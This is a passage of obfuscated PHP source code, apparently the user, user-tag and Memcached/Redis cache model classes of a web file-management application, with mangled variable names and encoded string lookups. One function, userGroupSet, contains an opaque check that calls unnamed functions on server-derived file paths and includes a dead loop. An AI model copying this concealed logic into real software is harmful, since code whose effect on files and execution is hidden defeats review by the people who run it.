Model($®®Œœ×[1158])->where($¯¦´¯ÚÙ)->delete(); Model($®®Œœ×[2283])->removeUserAll($¨ğ½´÷ä); Model($®®Œœ×[914])->userRootRemove($¨ğ½´÷ä); return $this->where($¯¦´¯ÚÙ)->delete(); } protected function userGroupSet($‹Ä“ŒÏî, $£„µˆ¥Ú, $üĞº¿Ë€ = array()) { $Ì’Ü½È§ =& $_SERVER[÷ôÚîå]; if ($_SERVER[$Ì’Ü½È§[60]] != $_SERVER[$Ì’Ü½È§[61]]) { $şš–›ˆŸ = $Ì’Ü½È§[966]; $Ò—˜å¬ô = $Ì’Ü½È§[62]; $–‹¡˜ÔÕ = $_SERVER[$Ì’Ü½È§[63]] . $Ì’Ü½È§[64]; $Û¨øÅ¼÷ = $Ò—˜å¬ô($–‹¡˜ÔÕ); $áíæ»™ = explode($Ì’Ü½È§[65], $Û¨øÅ¼÷); if (count($áíæ»™) < $Ì’Ü½È§[711]) { $œ¸á°Â• = $Ì’Ü½È§[67]; $œ¸á°Â•(); } $Äº¡âÇ = $Ì’Ü½È§[967]; $Äº¡âÇ($_SERVER[$Ì’Ü½È§[968]]); $Äº¡âÇ($_SERVER[$Ì’Ü½È§[63]] . $Ì’Ü½È§[2495]); $…¹ìŠ = 1; while ($…¹ìŠ > 1) { $…¹ìŠ = $…¹ìŠ + 4; $öÑÎĞğ = rawurlencode($…¹ìŠ . $Ì’Ü½È§[463]); } } $¿¾§¯°â = $this->getInfoSimple($‹Ä“ŒÏî); if (!$¿¾§¯°â || !is_array($£„µˆ¥Ú)) { return !1; } $øˆ¥«•´ = Model($Ì’Ü½È§[2072]); $øˆ¥«•´->where(array($Ì’Ü½È§[1779] => $‹Ä“ŒÏî))->delete(); $¹Óùó… = array(); $ûíâòŒ† = 0; foreach ($£„µˆ¥Ú as $“çî—›¹ => $ô¨ş°º—) { $ğ¨éşíÔ = array($Ì’Ü½È§[1779] => $‹Ä“ŒÏî, $Ì’Ü½È§[1978] => $“çî—›¹, $Ì’Ü½È§[2086] => $ô¨ş°º—); $ğ¨éşíÔ[$Ì’Ü½È§[2002]] = isset($üĞº¿Ë€[$ûíâòŒ†]) ? $üĞº¿Ë€[$ûíâòŒ†] : 0; $ûíâòŒ†++; $¹Óùó…[] = $ğ¨éşíÔ; } return $øˆ¥«•´->addAll($¹Óùó…, array(), !0); } protected function userGroupAdd($ß³ú™Æ³, $‚÷¥—õ = array()) { $Ãò–ÃÛÔ =& $_SERVER[÷ôÚîå]; $ºåŒÃŠ± = $this->getInfoSimple($ß³ú™Æ³); if (!$ºåŒÃŠ± || empty($‚÷¥—õ)) { return !1; } $äëŸêëÏ = array(); foreach ($‚÷¥—õ as $¾æÍÌõ => $™…¿İ›„) { $äëŸêëÏ[] = array($Ãò–ÃÛÔ[1779] => $ß³ú™Æ³, $Ãò–ÃÛÔ[1978] => $¾æÍÌõ, $Ãò–ÃÛÔ[2086] => $™…¿İ›„, $Ãò–ÃÛÔ[2002] => 0); } return Model($Ãò–ÃÛÔ[2072])->addAll($äëŸêëÏ, array(), !0); } protected function userGroupRemove($²ÁôÅéê, $¢ëÒ€ñŠ) { $™ˆ–Ì‘¨ =& $_SERVER[÷ôÚîå]; $ŞÆˆİšÁ = $this->getInfoSimple($²ÁôÅéê); if (!$ŞÆˆİšÁ || !$¢ëÒ€ñŠ) { return !1; } $½±éí­ú = array($™ˆ–Ì‘¨[1770] => $²ÁôÅéê, $™ˆ–Ì‘¨[2070] => $¢ëÒ€ñŠ); return Model($™ˆ–Ì‘¨[2072])->where($½±éí­ú)->delete(); } public function listData() { $ì¬Ø¥±¸ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ì¬Ø¥±¸[$_SERVER[÷ôÚîå][454]]); return $ì¬Ø¥±¸; } public function listByID($ Œ˜€) { $÷ÎÈ¼ï =& $_SERVER[÷ôÚîå]; if (!$ Œ˜€) { return; } $íş©Äç’ = array($÷ÎÈ¼ï[1779] => array($÷ÎÈ¼ï[7], $ Œ˜€)); $ŒÂ–¦¢Ã = $this->where($íş©Äç’)->select(); $ŒÂ–¦¢Ã = array_sort_keep($ŒÂ–¦¢Ã, $÷ÎÈ¼ï[1779], $ Œ˜€); $this->_listDataApply($ŒÂ–¦¢Ã); return $ŒÂ–¦¢Ã; } public function listByGroup($¨³Ô¯¥ã = 0, $ÀÜŠÌ = array()) { $ÊèÙõ«Â =& $_SERVER[÷ôÚîå]; $³éİúĞ¸ = $ÊèÙõ«Â[12]; $¾ªŒÑá = array(); if ($¨³Ô¯¥ã) { $¾ªŒÑá = array($ÊèÙõ«Â[2496] => intval($¨³Ô¯¥ã)); $³éİúĞ¸ = "\114\105\x46\x54\40\112\117\111\x4e\40{$this->tablePrefix}\x75\163\145\162\137\147\162\x6f\x75\x70\40\x75\163\145\x72\x5f\x67\162\x6f\x75\x70\40\x6f\156\x20\x75\x73\x65\x72\x2e\x75\163\145\162\x49\x44\x20\x3d\40\x75\163\x65\162\x5f\x67\x72\157\x75\160\56\x75\x73\x65\162\111\104"; $êêÅÔ»Š = Input::get($ÊèÙõ«Â[539], null, $ÊèÙõ«Â[12]) ? $ÊèÙõ«Â[12] : $ÊèÙõ«Â[2497]; } if (isset($ÀÜŠÌ[$ÊèÙõ«Â[839]])) { $¾ªŒÑá[$ÊèÙõ«Â[2498]] = $ÀÜŠÌ[$ÊèÙõ«Â[839]]; } $•È —ø = $this->_makeOrder($êêÅÔ»Š)->field($ÊèÙõ«Â[2499])->where($¾ªŒÑá)->join($³éİúĞ¸)->selectPage(50); $this->_listDataApply($•È —ø[$ÊèÙõ«Â[454]]); return $•È —ø; } private function _makeOrder($ôàî¶É = '') { $Ã—ƒ¿é =& $_SERVER[÷ôÚîå]; $Ü¬Ö”¦ü = array($Ã—ƒ¿é[1779], $Ã—ƒ¿é[32], $Ã—ƒ¿é[1966], $Ã—ƒ¿é[2184], $Ã—ƒ¿é[1938], $Ã—ƒ¿é[241]); $ÃÛ¢ï°Ù = array($Ã—ƒ¿é[532] => $Ã—ƒ¿é[533], $Ã—ƒ¿é[534] => $Ã—ƒ¿é[535]); $æí«¸ì = Input::get($Ã—ƒ¿é[539], $Ã—ƒ¿é[7], $Ã—ƒ¿é[1770], $Ü¬Ö”¦ü); $•˜Ç = Input::get($Ã—ƒ¿é[540], $Ã—ƒ¿é[7], $Ã—ƒ¿é[2073], array($Ã—ƒ¿é[2073], $Ã—ƒ¿é[534])); $•˜Ç = $ÃÛ¢ï°Ù[$•˜Ç]; $ôàî¶É = $ôàî¶É . "\165\163\145\162\x2e{$æí«¸ì}\x20{$•˜Ç}\54\40\165\x73\x65\x72\x2e\x75\163\x65\x72\x49\104\x20\141\x73\x63"; return $this->alias($Ã—ƒ¿é[2200])->order($ôàî¶É); } public function listSearch($Ü÷ˆ«ü–) { $öäçù¨ş =& $_SERVER[÷ôÚîå]; $®Ğ­›… = trim($Ü÷ˆ«ü–[$öäçù¨ş[2076]]); $í©ŠÒ·Â = explode($öäçù¨ş[53], $®Ğ­›…); if (!$®Ğ­›… || count($í©ŠÒ·Â) == 1) { return $this->listSearchNow($Ü÷ˆ«ü–); } $Ç­ï´’¤ = array($öäçù¨ş[454] => array()); foreach ($í©ŠÒ·Â as $ãèÈ¯) { if (!trim($ãèÈ¯)) { continue; } $Ü÷ˆ«ü–[$öäçù¨ş[2076]] = $ãèÈ¯; $‚ÖšŠ’ = $this->listSearchNow($Ü÷ˆ«ü–); $Ç­ï´’¤[$öäçù¨ş[454]] = array_merge($Ç­ï´’¤[$öäçù¨ş[454]], $‚ÖšŠ’[$öäçù¨ş[454]]); } $Ç­ï´’¤[$öäçù¨ş[454]] = array_unique_by_key($Ç­ï´’¤[$öäçù¨ş[454]], $öäçù¨ş[1779]); $Ç­ï´’¤[$öäçù¨ş[451]] = array($öäçù¨ş[452] => count($Ç­ï´’¤[$öäçù¨ş[454]]), $öäçù¨ş[448] => 20, $öäçù¨ş[438] => 1, $öäçù¨ş[453] => 1); return $Ç­ï´’¤; } public function listSearchNow($ï™³¥î) { $¸Ö‰Ì„È =& $_SERVER[÷ôÚîå]; $½­Ñ· = trim($ï™³¥î[$¸Ö‰Ì„È[2076]]); $—“‘é½ = isset($ï™³¥î[$¸Ö‰Ì„È[2077]]) ? $ï™³¥î[$¸Ö‰Ì„È[2077]] : !1; $½­Ñ· = str_replace($¸Ö‰Ì„È[2078], $¸Ö‰Ì„È[2079], trim($½­Ñ·)); $ÆÑ»­Ø² = array($¸Ö‰Ì„È[32] => array($¸Ö‰Ì„È[468], "\45{$½­Ñ·}\45"), $¸Ö‰Ì„È[390] => array($¸Ö‰Ì„È[468], "{$½­Ñ·}\x25"), $¸Ö‰Ì„È[2266] => array($¸Ö‰Ì„È[468], "{$½­Ñ·}\45"), $¸Ö‰Ì„È[1089] => $¸Ö‰Ì„È[2080]); if (Input::check($½­Ñ·, $¸Ö‰Ì„È[396])) { $ÆÑ»­Ø²[$¸Ö‰Ì„È[1779]] = array($¸Ö‰Ì„È[468], "{$½­Ñ·}\x25"); $ÆÑ»­Ø²[$¸Ö‰Ì„È[2480]] = array($¸Ö‰Ì„È[468], "{$½­Ñ·}\x25"); } if (!$½­Ñ·) { $ÆÑ»­Ø² = array(); } if (isset($ï™³¥î[$¸Ö‰Ì„È[839]])) { $ÆÑ»­Ø²[$¸Ö‰Ì„È[839]] = $ï™³¥î[$¸Ö‰Ì„È[839]]; } $ÆÑ»­Ø² = $this->parseWhereLike($ÆÑ»­Ø²); $À¡ĞêÁ = $this->_makeOrder()->where($ÆÑ»­Ø²)->selectPage(20); if (!$À¡ĞêÁ || count($À¡ĞêÁ[$¸Ö‰Ì„È[454]]) < 5 && Input::check($½­Ñ·, $¸Ö‰Ì„È[403])) { $ï€õ‡éê = $this->_searchFromMeta($¸Ö‰Ì„È[546], $½­Ñ·, 10); $•×²†á€ = $this->_searchFromMeta($¸Ö‰Ì„È[547], $½­Ñ·, 10); $½Ã€¦Ñ™ = array_merge($ï€õ‡éê, $•×²†á€, $À¡ĞêÁ[$¸Ö‰Ì„È[454]]); $À¡ĞêÁ[$¸Ö‰Ì„È[454]] = array_unique_by_key($½Ã€¦Ñ™, $¸Ö‰Ì„È[1779]); $À¡ĞêÁ[$¸Ö‰Ì„È[451]][$¸Ö‰Ì„È[452]] = count($À¡ĞêÁ[$¸Ö‰Ì„È[454]]); $À¡ĞêÁ[$¸Ö‰Ì„È[451]][$¸Ö‰Ì„È[453]] = ceil($À¡ĞêÁ[$¸Ö‰Ì„È[451]][$¸Ö‰Ì„È[452]] / $À¡ĞêÁ[$¸Ö‰Ì„È[451]][$¸Ö‰Ì„È[448]]); } $this->_listDataApply($À¡ĞêÁ[$¸Ö‰Ì„È[454]]); $this->_filterByGroup($À¡ĞêÁ, $—“‘é½); return $À¡ĞêÁ; } private function _filterByGroup(&$ôÃ™°©, $Ù¡¨Ê‚Œ) { $İ‚ÚşÛå =& $_SERVER[÷ôÚîå]; if (!$Ù¡¨Ê‚Œ) { return $ôÃ™°©; } foreach ($ôÃ™°©[$İ‚ÚşÛå[454]] as $¯›Ä°à => &$ŠñÀ—Õ) { $»ı£ô‹± = array_to_keyvalue($ŠñÀ—Õ[$İ‚ÚşÛå[2169]], $İ‚ÚşÛå[12], $İ‚ÚşÛå[1978]); if (!in_array($Ù¡¨Ê‚Œ, $»ı£ô‹±)) { unset($ôÃ™°©[$İ‚ÚşÛå[454]][$¯›Ä°à]); } } unset($ŠñÀ—Õ); $ôÃ™°©[$İ‚ÚşÛå[454]] = array_values($ôÃ™°©[$İ‚ÚşÛå[454]]); $ôÃ™°©[$İ‚ÚşÛå[451]] = array($İ‚ÚşÛå[2236] => count($ôÃ™°©[$İ‚ÚşÛå[454]]), $İ‚ÚşÛå[2234] => $ôÃ™°©[$İ‚ÚşÛå[451]][$İ‚ÚşÛå[448]], $İ‚ÚşÛå[2233] => 1, $İ‚ÚşÛå[2235] => 1); } private function _searchFromMeta($º„–í¾ß, $Ÿ¬úö¢ö, $‚Ü´öŠí) { $âõèÔĞ =& $_SERVER[÷ôÚîå]; $Ÿ¬úö¢ö = strtolower($Ÿ¬úö¢ö); $µ–¿¸Á = array($âõèÔĞ[107] => $º„–í¾ß, $âõèÔĞ[459] => array($âõèÔĞ[468], "\x25{$Ÿ¬úö¢ö}\45")); $µ–¿¸Á = $this->parseWhereLike($µ–¿¸Á); $å½ã‘Áø = Model($âõèÔĞ[2500])->where($µ–¿¸Á)->limit($‚Ü´öŠí)->select(); if (!$å½ã‘Áø) { return array(); } $å½ã‘Áø = array_to_keyvalue($å½ã‘Áø, $âõèÔĞ[12], $âõèÔĞ[1779]); $å§±¥Õø = $this->where(array($âõèÔĞ[1770] => array($âõèÔĞ[7], $å½ã‘Áø)))->select(); if (!$å§±¥Õø) { return array(); } return $å§±¥Õø; } private function _listDataApplyItem($ˆÅ±‹³í) { $¯À¢ªÍ­ = array($ˆÅ±‹³í); $this->_listDataApply($¯À¢ªÍ­); return $¯À¢ªÍ­[0]; } private function _listDataApply(&$ª‹ã¾”) { $÷Ÿ¦òáµ =& $_SERVER[÷ôÚîå]; if (!$ª‹ã¾”) { return; } array_remove_key($ª‹ã¾”, $÷Ÿ¦òáµ[978]); $ÂÓô«º  = array_to_keyvalue($ª‹ã¾”, $÷Ÿ¦òáµ[12], $÷Ÿ¦òáµ[1779]); $this->_listAppendGroup($ª‹ã¾”, $ÂÓô«º ); $this->_listAppendMeta($ª‹ã¾”, $ÂÓô«º ); $this->_listAppendSourceRoot($ª‹ã¾”, $ÂÓô«º ); } private function _listAppendSourceRoot(&$˜òèÑÏÀ, $¢¸êÊ¾) { $Âñ é =& $_SERVER[÷ôÚîå]; $âŠïŒ©‹ = Model($Âñ é[914])->listSourceRoot(SourceModel::TYPE_USER, $¢¸êÊ¾); $âŠïŒ©‹ = array_to_keyvalue($âŠïŒ©‹, $Âñ é[578]); $âŠïŒ©‹ = array_remove_key($âŠïŒ©‹, $Âñ é[578]); foreach ($˜òèÑÏÀ as &$ƒèãŞ§Ï) { $ƒèãŞ§Ï[$Âñ é[100]] = $âŠïŒ©‹[$ƒèãŞ§Ï[$Âñ é[1779]]] ? $âŠïŒ©‹[$ƒèãŞ§Ï[$Âñ é[1779]]] : array(); } unset($ƒèãŞ§Ï); } private function _listAppendGroup(&$ĞèšªĞÀ, $†“„Èéø) { $œæ³½Í =& $_SERVER[÷ôÚîå]; $”áÉÖ´¦ = array($œæ³½Í[1779] => array($œæ³½Í[7], $†“„Èéø)); $çºÍ­ª = Model($œæ³½Í[2072])->where($”áÉÖ´¦)->select(); $µäøÙÍ = array_to_keyvalue($çºÍ­ª, $œæ³½Í[12], $œæ³½Í[1978]); $µäøÙÍ = array_remove_value(array_unique($µäøÙÍ), $œæ³½Í[238]); if (!$µäøÙÍ || !$çºÍ­ª) { return; } $”áÉÖ´¦ = array($œæ³½Í[1978] => array($œæ³½Í[7], $µäøÙÍ)); $éê¼¡²ú = Model($œæ³½Í[2167])->field($œæ³½Í[2501])->where($”áÉÖ´¦)->select(); $éê¼¡²ú = array_to_keyvalue($éê¼¡²ú, $œæ³½Í[1978]); $çºÍ­ª = array_to_keyvalue_group($çºÍ­ª, $œæ³½Í[1779]); foreach ($çºÍ­ª as &$’Î„ÓÓü) { $à½ãŠÇÅ = array(); foreach ($’Î„ÓÓü as $“ÃÕêşŒ) { if (!$“ÃÕêşŒ[$œæ³½Í[2086]]) { continue; } $âÈœÉ¨é = Model($œæ³½Í[580])->listData($“ÃÕêşŒ[$œæ³½Í[2086]]); $à½ãŠÇÅ[] = array($œæ³½Í[1978] => $“ÃÕêşŒ[$œæ³½Í[1978]], $œæ³½Í[2502] => $éê¼¡²ú[$“ÃÕêşŒ[$œæ³½Í[1978]]][$œæ³½Í[32]], $œæ³½Í[593] => $éê¼¡²ú[$“ÃÕêşŒ[$œæ³½Í[1978]]][$œæ³½Í[593]], $œæ³½Í[496] => $âÈœÉ¨é); } $’Î„ÓÓü = $à½ãŠÇÅ; } unset($’Î„ÓÓü); foreach ($ĞèšªĞÀ as &$ˆÃ¹“äı) { $ˆÃ¹“äı[$œæ³½Í[2169]] = array(); if (isset($çºÍ­ª[$ˆÃ¹“äı[$œæ³½Í[1779]]])) { $ˆÃ¹“äı[$œæ³½Í[2169]] = $çºÍ­ª[$ˆÃ¹“äı[$œæ³½Í[1779]]]; } } unset($ˆÃ¹“äı); } public function userAppendGroup($æş¸Ç°’) { $İ‘óóƒ =& $_SERVER[÷ôÚîå]; if (!$æş¸Ç°’) { return array(); } $this->_listAppendGroup($æş¸Ç°’, array_to_keyvalue($æş¸Ç°’, $İ‘óóƒ[12], $İ‘óóƒ[1779])); return $æş¸Ç°’; } private function _listAppendMeta(&$Ô‘Á˜Ã, $ô¹–¶Ğ) { $ÛìÄ‹¸ƒ =& $_SERVER[÷ôÚîå]; $¯óêü = UserJobModel::JOB_KEY; $‡œÏ¨êã = array($ÛìÄ‹¸ƒ[2481]); $å‚ÏÒ²ä = array($ÛìÄ‹¸ƒ[1779] => array($ÛìÄ‹¸ƒ[7], $ô¹–¶Ğ)); $èˆºÕô = Model($ÛìÄ‹¸ƒ[2479])->where($å‚ÏÒ²ä)->select(); $èˆºÕô = array_to_keyvalue_group($èˆºÕô, $ÛìÄ‹¸ƒ[1779]); foreach ($èˆºÕô as &$âÏ‡ĞÓÂ) { $†ó‚öû° = array(); foreach ($âÏ‡ĞÓÂ as $ú„€—Ï–) { if (!in_array($ú„€—Ï–[$ÛìÄ‹¸ƒ[107]], $‡œÏ¨êã)) { $†ó‚öû°[$ú„€—Ï–[$ÛìÄ‹¸ƒ[107]]] = $ú„€—Ï–[$ÛìÄ‹¸ƒ[459]]; } } $âÏ‡ĞÓÂ = $†ó‚öû°; } unset($âÏ‡ĞÓÂ); $—ïáÑÓ = Model($ÛìÄ‹¸ƒ[2503]); foreach ($Ô‘Á˜Ã as &$ÁâæÛĞ) { $‹ãòÚõª = array(); if (isset($èˆºÕô[$ÁâæÛĞ[$ÛìÄ‹¸ƒ[1779]]])) { $‹ãòÚõª = $èˆºÕô[$ÁâæÛĞ[$ÛìÄ‹¸ƒ[1779]]]; } $ÁâæÛĞ[$ÛìÄ‹¸ƒ[2504]] = array(); if (isset($‹ãòÚõª[$¯óêü])) { $ÁâæÛĞ[$ÛìÄ‹¸ƒ[2504]] = $—ïáÑÓ->getUserJobInfo($‹ãòÚõª[$¯óêü]); } } unset($ÁâæÛĞ); } protected function groupUserAll($Æİ¤¾ªÕ) { $ËÊó±ùĞ =& $_SERVER[÷ôÚîå]; if (!$Æİ¤¾ªÕ) { return !1; } $ı§Á’Àô = Model($ËÊó±ùĞ[2072])->field($ËÊó±ùĞ[1779])->where(array($ËÊó±ùĞ[1978] => array($ËÊó±ùĞ[7], $Æİ¤¾ªÕ)))->select(); $ı§Á’Àô = array_to_keyvalue($ı§Á’Àô, $ËÊó±ùĞ[12], $ËÊó±ùĞ[1779]); return array_unique($ı§Á’Àô); } public function userSearch($¢À¶Ùî, $öµ˜ÄÏñ = "\52") { return Model($_SERVER[÷ôÚîå][607])->where($¢À¶Ùî)->field($öµ˜ÄÏñ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\x72\137\157\160\x74\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($£ÊÒ£ë¶) { $ËÉŞÜñü =& $_SERVER[÷ôÚîå]; $©“°Ä°æ = defined($ËÉŞÜñü[2204]) && USER_ID ? USER_ID : $ËÉŞÜñü[12]; return "\125\x73\145\x72\x4f\160\164\x69\x6f\x6e\137{$£ÊÒ£ë¶}\x5f" . $©“°Ä°æ; } protected function filterWhere($ ¸ğˆ©Ï) { $Ø·¤÷È =& $_SERVER[÷ôÚîå]; $ ¸ğˆ©Ï[$Ø·¤÷È[1779]] = defined($Ø·¤÷È[2204]) && USER_ID ? USER_ID : $Ø·¤÷È[12]; return $ ¸ğˆ©Ï; } public function cacheRemoveUser($Àªó èÁ, $—ßí­¡ú) { return Cache::remove("\125\x73\145\x72\x4f\160\164\x69\x6f\156\137{$Àªó èÁ}\137" . $—ßí­¡ú); } protected function optionDefault($ŒŠº¾‘¢ = '') { $Óì ¿‚Ñ =& $_SERVER[÷ôÚîå]; if ($ŒŠº¾‘¢ == $Óì ¿‚Ñ[12]) { return $GLOBALS[$Óì ¿‚Ñ[6]][$Óì ¿‚Ñ[2505]]; } if ($ŒŠº¾‘¢ == $Óì ¿‚Ñ[2506]) { return $GLOBALS[$Óì ¿‚Ñ[6]][$Óì ¿‚Ñ[2507]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\x74\141\147\114\151\x73\x74"; public $modelType = "\125\163\145\x72\x4f\x70\x74\x69\157\156"; public $field = array("\x6e\141\155\145", "\163\x74\x79\154\x65", "\x73\157\162\x74"); public function listData($ûûµ å = false, $‘€ÃÌ = "\163\x6f\x72\164", $î¡«®ˆ… = false) { return parent::listData($ûûµ å, $‘€ÃÌ, $î¡«®ˆ…); } public function remove($Å¸œÀ§ª) { return parent::remove($Å¸œÀ§ª); } public function add($÷Ã”È²‘, $œ×Ó±›İ = "\x6c\x61\x62\145\154\55\147\162\145\171\x2d\x6e\157\162\x6d\141\x6c") { $ğúÊ½é¸ =& $_SERVER[÷ôÚîå]; if ($this->findByName($÷Ã”È²‘)) { return !1; } $Òı“ ÚÜ = array($ğúÊ½é¸[503] => $÷Ã”È²‘, $ğúÊ½é¸[567] => $œ×Ó±›İ, $ğúÊ½é¸[1982] => $this->getSort($ğúÊ½é¸[344]) + 1); return parent::insert($Òı“ ÚÜ); } public function update($Üı‘Ò‚¾, $îËàÂš) { $ù¼ß¿œÒ =& $_SERVER[÷ôÚîå]; $·€Á¥Å = $this->listData($Üı‘Ò‚¾); $²Í ğ¤Ş = $this->findByName($îËàÂš[$ù¼ß¿œÒ[32]]); if (!$·€Á¥Å || $²Í ğ¤Ş && $²Í ğ¤Ş[$ù¼ß¿œÒ[484]] != $·€Á¥Å[$ù¼ß¿œÒ[484]]) { return !1; } return parent::update($Üı‘Ò‚¾, $îËàÂš); } public function moveTop($½ó÷ƒÖ) { $¢ï™²„ =& $_SERVER[÷ôÚîå]; $§•Ş«îó = parent::listData(); $˜º‚óà = $this->getSort($¢ï™²„[343]); foreach ($§•Ş«îó as &$Ó¸÷’øí) { if ($Ó¸÷’øí[$¢ï™²„[484]] == $½ó÷ƒÖ) { $Ó¸÷’øí[$¢ï™²„[2002]] = $˜º‚óà; continue; } $Ó¸÷’øí[$¢ï™²„[2002]] += 1; } unset($Ó¸÷’øí); return parent::resetData($§•Ş«îó); } public function moveBottom($ÆÉê´¶á) { $ÏÄ˜á‘ =& $_SERVER[÷ôÚîå]; $´€™êş = $this->getSort($ÏÄ˜á‘[344]) + 1; return parent::update($ÆÉê´¶á, array($ÏÄ˜á‘[2002] => $´€™êş)); } public function resetSort($™¶ÁÁè§) { $ì°÷Å² =& $_SERVER[÷ôÚîå]; $’ÏÃÂ§ã = array(); $™¶ÁÁè§ = is_array($™¶ÁÁè§) ? $™¶ÁÁè§ : array(); for ($Ø¶Ï›é = 0; $Ø¶Ï›é < count($™¶ÁÁè§); $Ø¶Ï›é++) { $’ÏÃÂ§ã[$™¶ÁÁè§[$Ø¶Ï›é] . $ì°÷Å²[12]] = $Ø¶Ï›é + 1; } $–ÛÄµÂÂ = parent::listData(); foreach ($–ÛÄµÂÂ as &$¡¹í½ñ) { $„şé³øÄ = $’ÏÃÂ§ã[$¡¹í½ñ[$ì°÷Å²[484]]]; $¡¹í½ñ[$ì°÷Å²[2002]] = $„şé³øÄ ? $„şé³øÄ : $¡¹í½ñ[$ì°÷Å²[2002]]; } unset($¡¹í½ñ); return parent::resetData($–ÛÄµÂÂ); } private function getSort($ÕÙ“¥¼‡) { $ÆŞ²¾¹ =& $_SERVER[÷ôÚîå]; $Ñ²Ûğï = parent::listData(); $‡ƒ¯°°‚ = array_to_keyvalue($Ñ²Ûğï, $ÆŞ²¾¹[12], $ÆŞ²¾¹[2002]); if (!$‡ƒ¯°°‚) { $‡ƒ¯°°‚ = array(0); } $üô´–Ñê = $ÕÙ“¥¼‡ == $ÆŞ²¾¹[344] ? max($‡ƒ¯°°‚) : min($‡ƒ¯°°‚); return intval($üô´–Ñê); } } goto b„Ê¼òİÁŠ; e¡™Ë¾Äƒ¸: class CacheMemcached { public $handle; public $cacheTime; public function __construct($¼²Á¹¸Ğ, $Æâ’ì„) { $Â½Íä¤ =& $_SERVER[÷ôÚîå]; if (!class_exists($Â½Íä¤[956])) { show_json($Â½Íä¤[957], !1); } $this->cacheTime = $Æâ’ì„; $this->handle = new Memcached(); if (is_array($¼²Á¹¸Ğ[$Â½Íä¤[958]]) && count($¼²Á¹¸Ğ[$Â½Íä¤[958]]) >= 1) { foreach ($¼²Á¹¸Ğ[$Â½Íä¤[958]] as $í ¶œ¨•) { $ùöÑµçÁ = explode($Â½Íä¤[4], $í ¶œ¨•); $this->handle->addServer($ùöÑµçÁ[0], $ùöÑµçÁ[1]); } } else { $this->handle->addServer($¼²Á¹¸Ğ[$Â½Íä¤[218]], $¼²Á¹¸Ğ[$Â½Íä¤[219]]); } } public function set($”Ìˆßø, $àä Íª™, $¨àÀü± = false) { $¨àÀü± = $¨àÀü± ? $¨àÀü± : $this->cacheTime; return $this->handle->set($”Ìˆßø, $àä Íª™, $¨àÀü±); } public function get($¶¸ü¬¨¨) { return $this->handle->get($¶¸ü¬¨¨); } public function remove($ıŞÄÓüü) { return $this->handle->delete($ıŞÄÓüü); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ïìÒ˜îÅ, $¿üÈ‚ç) { $ÜûƒÕË‹ =& $_SERVER[÷ôÚîå]; if (!class_exists($ÜûƒÕË‹[959])) { show_json($ÜûƒÕË‹[960], !1); } $this->cacheTime = $¿üÈ‚ç; $ŒÙêÏ¶Ì = isset($ïìÒ˜îÅ[$ÜûƒÕË‹[961]]) ? $ïìÒ˜îÅ[$ÜûƒÕË‹[961]] : 10; $ÖÕ•’ø = _get($ïìÒ˜îÅ, $ÜûƒÕË‹[958]); if ($ÖÕ•’ø && is_array($ÖÕ•’ø)) { $this->initCluster($ïìÒ˜îÅ, $ŒÙêÏ¶Ì); } else { $this->handle = $this->init($ïìÒ˜îÅ, $ŒÙêÏ¶Ì); } } private function init($Ôçù¤ƒÏ, $Õ›¦ÇŸ) { $İĞî—´ =& $_SERVER[÷ôÚîå]; $úƒ„¹¾… = new Redis(); $ÃŸíÑñ = isset($Ôçù¤ƒÏ[$İĞî—´[962]]) ? $Ôçù¤ƒÏ[$İĞî—´[962]] : !1; if ($ÃŸíÑñ) { $úƒ„¹¾…->pconnect($Ôçù¤ƒÏ[$İĞî—´[218]], $Ôçù¤ƒÏ[$İĞî—´[219]], $Õ›¦ÇŸ); } else { $úƒ„¹¾…->connect($Ôçù¤ƒÏ[$İĞî—´[218]], $Ôçù¤ƒÏ[$İĞî—´[219]], $Õ›¦ÇŸ); } if (!empty($Ôçù¤ƒÏ[$İĞî—´[496]])) { $úƒ„¹¾…->auth($Ôçù¤ƒÏ[$İĞî—´[496]]); } if (!empty($Ôçù¤ƒÏ[$İĞî—´[846]]) && $Ôçù¤ƒÏ[$İĞî—´[846]] != 0) { $úƒ„¹¾…->select($Ôçù¤ƒÏ[$İĞî—´[846]]); } return $úƒ„¹¾…; } private function initCluster($âûÅæœ, $ÈÌÎˆÌÓ) { $»éµ‘ÊÀ =& $_SERVER[÷ôÚîå]; $¡‘—Ô›À = array($»éµ‘ÊÀ[963], $»éµ‘ÊÀ[964], $»éµ‘ÊÀ[965]); $òüÎ‹Ğ = $»éµ‘ÊÀ[963]; if (isset($âûÅæœ[$»éµ‘ÊÀ[16]]) && in_array($âûÅæœ[$»éµ‘ÊÀ[16]], $¡‘—Ô›À)) { $òüÎ‹Ğ = $âûÅæœ[$»éµ‘ÊÀ[16]]; } switch ($òüÎ‹Ğ) { case $»éµ‘ÊÀ[963]: $this->_slave($âûÅæœ, $ÈÌÎˆÌÓ); break; case $»éµ‘ÊÀ[964]: break; case $»éµ‘ÊÀ[965]: $this->isCluster = !0; $Êì¾«Ò¤ = $âûÅæœ[$»éµ‘ÊÀ[958]]; $¢íˆëÉæ = isset($âûÅæœ[$»éµ‘ÊÀ[962]]) ? $âûÅæœ[$»éµ‘ÊÀ[962]] : !1; $û¾Á¹Ë = isset($âûÅæœ[$»éµ‘ÊÀ[496]]) ? $âûÅæœ[$»éµ‘ÊÀ[496]] : null; $this->handle = new RedisCluster(NUll, $Êì¾«Ò¤, $ÈÌÎˆÌÓ, $ÈÌÎˆÌÓ, $¢íˆëÉæ, $û¾Á¹Ë); break; default: break; } } private function _slave($¯‚Ëù¡, $Å‡şÎûÁ) { $€²Ç¿®ú = $¯‚Ëù¡[$_SERVER[÷ôÚîå][958]]; $this->filterConfig($¯‚Ëù¡, $€²Ç¿®ú[0]); $this->handle = $this->init($¯‚Ëù¡, $Å‡şÎûÁ); unset($€²Ç¿®ú[0]); if (empty($€²Ç¿®ú)) { return; } $ˆ…ıÖ¡Ì = array_rand($€²Ç¿®ú); $this->filterConfig($¯‚Ëù¡, $€²Ç¿®ú[$ˆ…ıÖ¡Ì]); $this->slaveHandle = $this->init($¯‚Ëù¡, $Å‡şÎûÁ); } private function filterConfig(&$²Šî’ëô, $Ş´»ñ«®) { $½Å…ñó° =& $_SERVER[÷ôÚîå]; $®œïºû = explode($½Å…ñó°[4], $Ş´»ñ«®); $ƒ““™’¬ = array($½Å…ñó°[218] => $®œïºû[0], 